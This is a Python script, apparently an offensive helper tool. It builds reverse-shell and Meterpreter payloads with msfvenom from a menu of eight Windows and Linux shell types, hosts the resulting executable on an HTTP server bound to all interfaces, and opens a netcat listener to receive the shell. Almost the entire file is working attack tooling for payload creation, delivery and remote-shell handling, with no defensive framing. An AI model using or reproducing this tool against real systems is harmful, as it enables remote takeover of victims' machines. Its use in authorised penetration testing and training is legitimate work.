import http.server
import socketserver
import subprocess
import os
import threading

def generate_payload(payload_type, lhost, lport, payload_file):
    """Generates the payload using msfvenom."""
    try:
        command = [
            "msfvenom",
            "-p", payload_type,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "exe",  # Adjust the format if needed
            "-o", payload_file
        ]
        subprocess.run(command, check=True)
        print(f"[+] Payload generated: {payload_file}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[-] Payload generation failed: {e}")
        return False

def start_http_server(host, port, payload_file):
    """Starts a simple HTTP server to serve the payload."""
    class MyHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            print(f"[+] Incoming request from {self.client_address[0]} for {self.path}")
            # Remove the leading '/' from the path
            requested_file = self.path[1:]
            if os.path.exists(requested_file):
                print(f"[+] Serving file: {requested_file}")
                return http.server.SimpleHTTPRequestHandler.do_GET(self)
            elif self.path == '/':
                # Show directory listing
                try:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b"<html><head><title>Available Files</title></head><body>")
                    self.wfile.write(b"<h1>Available Files:</h1>")
                    for filename in os.listdir('.'):
                        self.wfile.write(f"<a href='/{filename}'>{filename}</a><br>".encode())
                    self.wfile.write(b"</body></html>")
                except Exception as e:
                    print(f"[-] Error listing directory: {e}")
            else:
                print(f"[-] File not found: {requested_file}")
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"Not Found")
                return

    try:
        with socketserver.TCPServer((host, port), MyHandler) as httpd:
            print(f"[+] Serving payload on http://{host}:{port}/{payload_file}")
            print(f"[+] Browse all files at http://{host}:{port}/")
            httpd.serve_forever()
    except Exception as e:
        print(f"[-] HTTP server error: {e}")

def start_listener(lhost, lport):
    """Starts a netcat listener in the same terminal."""
    try:
        listener_command = ["nc", "-lvp", str(lport)]
        print(f"[+] Starting listener on port {lport}...")
        subprocess.run(listener_command)

    except FileNotFoundError:
        print("[-] nc not found. Please install netcat.")
    except Exception as e:
        print(f"[-] Listener error: {e}")

def get_payload(payload_source, payload_type, lhost, lport, payload_file):
    """Gets the payload, either from a file or generates it."""
    if payload_source == "1":  # Use '1' for file
        if not os.path.exists(payload_file):
            print(f"[-] Payload file not found: {payload_file}")
            return None
        print(f"[+] Using payload from file: {payload_file}")
        return payload_file
    elif payload_source == "2":  # Use '2' for msfvenom
        if generate_payload(payload_type, lhost, lport, payload_file):
            return payload_file
        else:
            return None
    else:
        print("[-] Invalid payload source. Choose '1' or '2'.")
        return None

if __name__ == "__main__":
    while True:
        payload_source = input("Enter payload source ('1' for file, '2' for msfvenom): ")
        if payload_source in ("1", "2"):
            break
        else:
            print("Invalid choice. Please enter '1' or '2'.")

    payload_file = input("Enter payload file name: ")

    if payload_source == "2":
        while True:
            print("\nChoose a payload type:")
            print("1. windows/x64/meterpreter_reverse_tcp")
            print("2. windows/x64/shell_reverse_tcp")
            print("3. linux/x64/shell_reverse_tcp")
            print("4. windows/meterpreter/reverse_tcp")
            print("5. linux/x86/shell_reverse_tcp")
            print("6. windows/x64/meterpreter/reverse_https")
            print("7. windows/x64/meterpreter/bind_tcp")
            print("8. cmd/unix/reverse_python")
            choice = input("Enter your choice (1-8): ")
            if choice in ("1", "2", "3", "4", "5", "6", "7", "8"):
                payload_types = {
                    "1": "windows/x64/meterpreter_reverse_tcp",
                    "2": "windows/x64/shell_reverse_tcp",
                    "3": "linux/x64/shell_reverse_tcp",
                    "4": "windows/meterpreter/reverse_tcp",
                    "5": "linux/x86/shell_reverse_tcp",
                    "6": "windows/x64/meterpreter/reverse_https",
                    "7": "windows/x64/meterpreter/bind_tcp",
                    "8": "cmd/unix/reverse_python"
                }
                payload_type = payload_types[choice]
                break
            else:
                print("Invalid choice. Please enter a number between 1 and 8.")

        lhost = input("Enter LHOST (your IP): ")
        lport = int(input("Enter LPORT: "))
    elif payload_source == "1":
        lhost = input("Enter LHOST (your IP): ")
        lport = int(input("Enter LPORT: "))
        payload_type = ""

    payload_file = get_payload(payload_source, payload_type, lhost, lport, payload_file)

    if payload_file:
        files = os.listdir('.')
        print("\n[+] Files available in current directory:")
        print("----------------------------------------")
        for i, filename in enumerate(files, 1):
            print(f"{i:2d}. {filename}")
        print("----------------------------------------\n")

        http_thread = threading.Thread(target=start_http_server, args=("0.0.0.0", 8000, payload_file))
        http_thread.daemon = True
        http_thread.start()

        start_listener(lhost, lport)

        input("[+] Press Enter to stop the script and clean up...")

        print("[+] Cleaning up...")